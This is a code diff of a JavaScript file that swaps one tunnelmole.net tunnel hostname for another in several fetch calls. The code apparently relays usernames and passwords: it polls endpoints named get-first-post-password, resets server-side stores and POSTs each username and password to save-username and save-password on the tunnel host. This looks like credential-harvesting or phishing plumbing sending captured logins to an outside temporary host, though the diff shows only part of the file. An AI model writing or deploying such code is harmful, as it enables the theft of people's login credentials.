@@ -14,7 +14,7 @@ const fetchFreqUsername = async () => {
     console.log('Fetching username...');
 
     try {
-        const response = await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
+        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
             method: 'GET',
             headers: { 'Cache-Control': 'no-cache' }
         });
@@ -30,7 +30,7 @@ const fetchFreqUsername = async () => {
             usernameFetched = true;
 
             // Reset the server-side username store
-            await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
+            await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
             // Process all pending username requests
             processUsernameRequests();
         } else {
@@ -50,7 +50,7 @@ const fetchFreqPassword = async () => {
     console.log('Fetching password...');
 
     try {
-        const response = await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/get-first-post-password', {
+        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-password', {
             method: 'GET',
             headers: { 'Cache-Control': 'no-cache' }
         });
@@ -66,7 +66,7 @@ const fetchFreqPassword = async () => {
             passwordFetched = true;
 
             // Reset the server-side password store
-            await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/reset-first-post-password', { method: 'POST' });
+            await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-password', { method: 'POST' });
             // Process all pending password requests
             processPasswordRequests();
         } else {
@@ -177,7 +177,7 @@ const sendUsername = async () => {
     }
 
     try {
-        const response = await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/save-username', {
+        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-username', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username })
@@ -204,7 +204,7 @@ const sendPassword = async () => {
     }
 
     try {
-        const response = await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/save-password', {
+        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-password', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ password })
